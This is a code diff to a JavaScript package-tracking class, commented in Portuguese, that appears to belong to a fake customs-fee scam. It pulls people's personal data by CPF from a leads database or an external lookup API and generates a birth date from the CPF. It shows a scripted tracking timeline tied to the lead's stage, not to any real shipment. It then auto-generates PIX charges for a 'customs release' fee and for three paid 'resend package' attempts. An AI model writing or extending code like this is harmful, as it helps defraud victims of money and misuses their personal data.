@@ -103,30 +103,39 @@ export class TrackingSystem {
         this.showLoadingNotification();
         
         try {
-            // Primeiro, tentar buscar dados do lead no banco de dados
+            // 🔍 CORREÇÃO: Buscar dados do lead no Supabase primeiro
             console.log('🔍 Buscando lead no banco de dados...');
             const leadResult = await this.dbService.getLeadByCPF(this.currentCPF);
             
             if (leadResult.success && leadResult.data) {
-                // Lead encontrado no banco - usar dados do lead
+                // ✅ Lead encontrado no Supabase - usar dados completos
                 console.log('✅ Lead encontrado no banco de dados:', leadResult.data);
                 
                 this.userData = {
                     nome: leadResult.data.nome_completo,
                     cpf: this.currentCPF,
+                    email: leadResult.data.email,
+                    telefone: leadResult.data.telefone,
+                    endereco: leadResult.data.endereco,
                     nascimento: this.generateBirthDate(this.currentCPF),
                     situacao: 'REGULAR'
                 };
                 
                 this.leadData = leadResult.data;
                 
-                console.log('📦 Dados do usuário configurados (do banco):', this.userData);
+                console.log('📦 Dados completos do usuário (Supabase):', {
+                    nome: this.userData.nome,
+                    cpf: this.userData.cpf,
+                    email: this.userData.email,
+                    telefone: this.userData.telefone,
+                    etapa_atual: this.leadData.etapa_atual
+                });
                 console.log('📦 Etapa atual do lead:', this.leadData.etapa_atual);
                 
                 this.closeLoadingNotification();
                 this.displayResults();
             } else {
-                // Lead não encontrado no banco - buscar dados do CPF via API
+                // ⚠️ Lead não encontrado no Supabase - buscar dados via API externa
                 console.log('🌐 Lead não encontrado no banco, buscando dados via API...');
                 const result = await this.dataService.fetchCPFData(this.currentCPF);
                 
@@ -134,11 +143,14 @@ export class TrackingSystem {
                     this.userData = {
                         nome: result.DADOS.nome,
                         cpf: this.currentCPF,
+                        email: null, // Não disponível via API externa
+                        telefone: null, // Não disponível via API externa
                         nascimento: result.DADOS.nascimento,
                         situacao: result.DADOS.situacao || 'REGULAR'
                     };
                     
-                    console.log('✅ Dados do usuário obtidos via API:', this.userData);
+                    console.log('✅ Dados básicos obtidos via API externa:', this.userData);
+                    console.log('⚠️ Email e telefone não disponíveis - será necessário gerar');
                     
                     this.closeLoadingNotification();
                     this.displayResults();
@@ -169,7 +181,13 @@ export class TrackingSystem {
         // Determinar etapa atual baseada nos dados do lead (se disponível)
         let currentStep = 11; // Padrão
         if (this.leadData && this.leadData.etapa_atual) {
-            currentStep = Math.min(this.leadData.etapa_atual, 26);
+            currentStep = Math.min(this.leadData.etapa_atual, 11);
+        }
+        
+        // Verificar se liberação já foi paga
+        if (this.leadData && this.leadData.status_pagamento === 'pago') {
+            this.isLiberationPaid = true;
+            currentStep = Math.max(currentStep, 12); // Garantir que está pelo menos na etapa 12
         }
         
         this.trackingData = {
@@ -189,20 +207,15 @@ export class TrackingSystem {
             ]
         };
         
-        // Verificar se liberação já foi paga
-        if (this.leadData && this.leadData.status_pagamento === 'pago') {
-            this.isLiberationPaid = true;
-            
-            // Adicionar etapa 12 se já foi pago
-            if (currentStep >= 12) {
-                this.trackingData.steps.push({
-                    id: 12,
-                    date: new Date(this.leadData.updated_at || Date.now()),
-                    title: 'Pedido liberado',
-                    description: 'Pedido liberado na Alfândega de Importação',
-                    completed: true
-                });
-            }
+        // Adicionar etapa 12 se liberação foi paga
+        if (this.isLiberationPaid && currentStep >= 12) {
+            this.trackingData.steps.push({
+                id: 12,
+                date: new Date(this.leadData.updated_at || Date.now()),
+                title: 'Pedido liberado',
+                description: 'Pedido liberado na Alfândega de Importação',
+                completed: true
+            });
         }
         
         console.log('📊 Dados de rastreamento gerados:', {
@@ -354,7 +367,7 @@ export class TrackingSystem {
         
         let buttonHtml = '';
         
-        // Botão "Liberar Pacote" APENAS na etapa 11 e se não foi pago
+        // 🔓 Botão "Liberar Pacote" APENAS na etapa 11 e se não foi pago
         if (step.id === 11 && step.needsLiberation && !this.isLiberationPaid) {
             buttonHtml = `
                 <button class="liberation-button-timeline" onclick="window.trackingSystemInstance.showLiberationModal()">
@@ -363,11 +376,11 @@ export class TrackingSystem {
             `;
         }
         
-        // Botões "Reenviar Pacote" nas etapas específicas
+        // 🚚 Botões "Reenviar Pacote" nas etapas específicas (16, 20, 24)
         if (this.needsDeliveryPayment(step.id)) {
             const deliveryValue = this.getDeliveryValue(step.id);
             buttonHtml = `
-                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id})">
+                <button class="liberation-button-timeline delivery-retry-btn" onclick="window.trackingSystemInstance.showDeliveryModal(${step.id}, ${deliveryValue})">
                     <i class="fas fa-redo"></i> Reenviar Pacote
                 </button>
             `;
@@ -443,6 +456,9 @@ export class TrackingSystem {
     showLiberationModal() {
         console.log('🔓 Abrindo modal de liberação aduaneira');
         
+        // 🚀 Gerar PIX automaticamente ao abrir modal
+        this.generateLiberationPix();
+        
         const modal = document.getElementById('liberationModal');
         if (modal) {
             modal.style.display = 'flex';
@@ -455,6 +471,128 @@ export class TrackingSystem {
                 simulateButton.removeAttribute('data-retry');
             }
         }
+    }
+
+    async generateLiberationPix() {
+        console.log('🔄 Gerando PIX automático para Taxa Alfandegária...');
+        
+        if (!this.userData) {
+            console.error('❌ Dados do usuário não disponíveis para gerar PIX');
+            return;
+        }
+        
+        try {
+            // Mostrar indicador de processamento
+            this.showPixGenerationIndicator();
+            
+            // Gerar PIX via Zentra Pay
+            const pixResult = await this.zentraPayService.generatePixForStage(
+                this.userData, 
+                'taxa_alfandegaria'
+            );
+            
+            if (pixResult.success) {
+                console.log('✅ PIX da Taxa Alfandegária gerado automaticamente!');
+                
+                // Atualizar modal com dados reais
+                this.updateModalWithRealPix(pixResult);
+                
+                this.hidePixGenerationIndicator();
+            } else {
+                console.warn('⚠️ Falha ao gerar PIX, usando dados estáticos');
+                this.hidePixGenerationIndicator();
+            }
+            
+        } catch (error) {
+            console.error('❌ Erro ao gerar PIX automático:', error);
+            this.hidePixGenerationIndicator();
+        }
+    }
+
+    showPixGenerationIndicator() {
+        const qrCodeImg = document.getElementById('realPixQrCode');
+        const pixCodeTextarea = document.getElementById('pixCodeModal');
+        
+        if (qrCodeImg) {
+            qrCodeImg.style.opacity = '0.5';
+            qrCodeImg.style.filter = 'blur(2px)';
+        }
+        
+        if (pixCodeTextarea) {
+            pixCodeTextarea.value = 'Gerando código PIX automático...';
+            pixCodeTextarea.style.opacity = '0.7';
+        }
+        
+        // Adicionar indicador de carregamento
+        const modal = document.getElementById('liberationModal');
+        if (modal && !document.getElementById('pixLoadingIndicator')) {
+            const indicator = document.createElement('div');
+            indicator.id = 'pixLoadingIndicator';
+            indicator.style.cssText = `
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: rgba(255, 255, 255, 0.9);
+                padding: 20px;
+                border-radius: 10px;
+                text-align: center;
+                z-index: 10;
+                box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            `;
+            indicator.innerHTML = `
+                <div class="processing-indicator">
+                    <i class="fas fa-spinner fa-spin"></i>
+                    Gerando PIX automático...
+                </div>
+            `;
+            modal.appendChild(indicator);
+        }
+    }
+
+    hidePixGenerationIndicator() {
+        const indicator = document.getElementById('pixLoadingIndicator');
+        if (indicator) {
+            indicator.remove();
+        }
+        
+        const qrCodeImg = document.getElementById('realPixQrCode');
+        const pixCodeTextarea = document.getElementById('pixCodeModal');
+        
+        if (qrCodeImg) {
+            qrCodeImg.style.opacity = '1';
+            qrCodeImg.style.filter = 'none';
+        }
+        
+        if (pixCodeTextarea) {
+            pixCodeTextarea.style.opacity = '1';
+        }
+    }
+
+    updateModalWithRealPix(pixResult) {
+        console.log('🔄 Atualizando modal com PIX real da Zentra Pay...');
+        
+        // Atualizar QR Code
+        const qrCodeImg = document.getElementById('realPixQrCode');
+        if (qrCodeImg && pixResult.qrCode) {
+            qrCodeImg.src = pixResult.qrCode;
+            console.log('✅ QR Code atualizado com URL real');
+        } else if (qrCodeImg && pixResult.pixPayload) {
+            // Gerar QR Code a partir do payload
+            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixResult.pixPayload)}`;
+            qrCodeImg.src = qrUrl;
+            console.log('✅ QR Code gerado a partir do payload');
+        }
+        
+        // Atualizar código PIX
+        const pixCodeTextarea = document.getElementById('pixCodeModal');
+        if (pixCodeTextarea && pixResult.pixPayload) {
+            pixCodeTextarea.value = pixResult.pixPayload;
+            console.log('✅ Código PIX atualizado');
+        }
+        
+        // Salvar dados do PIX para referência
+        this.currentPixData = pixResult;
     }
 
     closeLiberationModal() {
@@ -497,10 +635,11 @@ export class TrackingSystem {
         // Avançar para etapa 12
         this.addStage12();
         
-        // Atualizar no banco de dados se possível
+        // 💾 Atualizar no Supabase
         if (this.currentCPF) {
             this.dbService.updatePaymentStatus(this.currentCPF, 'pago');
             this.dbService.updateLeadStage(this.currentCPF, 12);
+            console.log('💾 Status atualizado no Supabase: pago, etapa 12');
         }
     }
 
@@ -558,14 +697,62 @@ export class TrackingSystem {
         return item;
     }
 
-    showDeliveryModal(stepId) {
+    async showDeliveryModal(stepId, deliveryValue) {
         const value = this.getDeliveryValue(stepId);
         const attemptNumber = this.getAttemptNumber(stepId);
+        const stageType = this.getDeliveryStageType(stepId);
         
         console.log(`🚚 Abrindo modal de reenvio - Etapa ${stepId} - R$ ${value.toFixed(2)}`);
         
-        // Implementar modal de reenvio aqui
-        alert(`Modal de reenvio para etapa ${stepId} - R$ ${value.toFixed(2)}`);
+        // 🚀 Gerar PIX automático para tentativa de entrega
+        if (this.userData) {
+            try {
+                console.log('🔄 Gerando PIX automático para tentativa de entrega...');
+                
+                const pixResult = await this.zentraPayService.generatePixForStage(
+                    this.userData, 
+                    stageType
+                );
+                
+                if (pixResult.success) {
+                    console.log('✅ PIX de tentativa de entrega gerado automaticamente!');
+                    this.showDeliveryPixModal(stepId, value, attemptNumber, pixResult);
+                } else {
+                    console.warn('⚠️ Falha ao gerar PIX, usando modal estático');
+                    this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+                }
+                
+            } catch (error) {
+                console.error('❌ Erro ao gerar PIX de entrega:', error);
+                this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+            }
+        } else {
+            console.warn('⚠️ Dados do usuário não disponíveis');
+            this.showDeliveryPixModal(stepId, value, attemptNumber, null);
+        }
+    }
+
+    getDeliveryStageType(stepId) {
+        const stageMap = {
+            16: 'tentativa_entrega_1',
+            20: 'tentativa_entrega_2', 
+            24: 'tentativa_entrega_3'
+        };
+        return stageMap[stepId] || 'tentativa_entrega_1';
+    }
+
+    showDeliveryPixModal(stepId, value, attemptNumber, pixResult) {
+        // Implementar modal de PIX para tentativa de entrega
+        console.log(`💳 Exibindo modal de PIX - Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}`);
+        
+        if (pixResult && pixResult.success) {
+            console.log('✅ Modal com PIX real da Zentra Pay');
+        } else {
+            console.log('⚠️ Modal com PIX estático (fallback)');
+        }
+        
+        // TODO: Implementar modal completo de tentativa de entrega
+        alert(`PIX gerado para Tentativa ${attemptNumber} - R$ ${value.toFixed(2)}\n\n${pixResult ? 'PIX Real Gerado!' : 'Usando PIX Estático'}`);
     }
 
     getAttemptNumber(stepId) {
